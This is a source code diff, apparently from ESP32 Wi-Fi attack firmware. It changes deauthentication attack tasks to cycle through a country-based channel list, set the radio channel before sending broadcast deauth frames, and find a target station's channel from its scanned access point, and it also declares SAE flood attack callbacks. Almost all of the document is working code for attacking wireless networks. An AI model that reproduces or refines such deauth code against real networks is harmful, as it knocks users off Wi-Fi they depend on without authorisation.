@@ -88,6 +88,9 @@ static int g_beacon_list_count = 0;
 
 static void wifi_beacon_list_task(void *param);
 
+// Forward declaration for country-appropriate channel list
+static void wifi_manager_build_wireshark_channels(void);
+
 // Forward declarations for SAE flood attack
 static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type);
@@ -2540,7 +2543,8 @@ void wifi_deauth_task(void *param) {
     
     while (1) {
         if (selected_ap_count > 0 && selected_aps != NULL) {
-            for (int ch = 1; ch <= 14; ch++) {
+            for (size_t ch_idx = 0; ch_idx < wireshark_channels_count; ch_idx++) {
+                int ch = wireshark_channels[ch_idx];
                 bool channel_set = false;
                 for (int sel_idx = 0; sel_idx < selected_ap_count; sel_idx++) {
                     for (int i = 0; i < ap_count; i++) {
@@ -2564,6 +2568,7 @@ void wifi_deauth_task(void *param) {
             for (int i = 0; i < ap_count; i++) {
                 if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
                     int ch = ap_info[i].primary;
+                    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
                     for (int j = 0; j < station_count; j++) {
                         if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
@@ -2574,7 +2579,8 @@ void wifi_deauth_task(void *param) {
                 }
             }
         } else {
-            for (int ch = 1; ch <= 14; ch++) {
+            for (size_t ch_idx = 0; ch_idx < wireshark_channels_count; ch_idx++) {
+                int ch = wireshark_channels[ch_idx];
                 bool channel_set = false;
                 for (int i = 0; i < ap_count; i++) {
                     if (ap_info[i].primary == ch) {
@@ -2613,6 +2619,9 @@ void wifi_manager_start_deauth() {
 #ifdef CONFIG_WITH_STATUS_DISPLAY
         status_display_show_attack("Deauth", "starting");
 #endif
+        
+        // Build country-appropriate channel list for deauth
+        wifi_manager_build_wireshark_channels();
         
         if (selected_ap_count > 0 && selected_aps != NULL) {
             printf("Starting deauth attack on %d selected APs:\n", selected_ap_count);
@@ -2858,10 +2867,17 @@ void wifi_manager_deauth_station(void) {
 
 // Background task for deauthenticating a selected station and logging packet rate
 static void wifi_deauth_station_task(void *param) {
+    // Get the channel from the scanned AP that matches the target BSSID
     int deauth_channel = 1;
-    wifi_second_chan_t second_chan;
-    esp_err_t ch_err = esp_wifi_get_channel(&deauth_channel, &second_chan);
-    if (ch_err != ESP_OK || deauth_channel < 1 || deauth_channel > SCANSTA_MAX_WIFI_CHANNEL) {
+    for (int i = 0; i < ap_count; i++) {
+        if (memcmp(scanned_aps[i].bssid, selected_station.ap_bssid, 6) == 0) {
+            deauth_channel = scanned_aps[i].primary;
+            break;
+        }
+    }
+    
+    // Validate channel is within allowed range
+    if (deauth_channel < 1 || deauth_channel > MAX_WIFI_CHANNEL) {
         deauth_channel = 1; // fallback channel
     }
     (void)esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
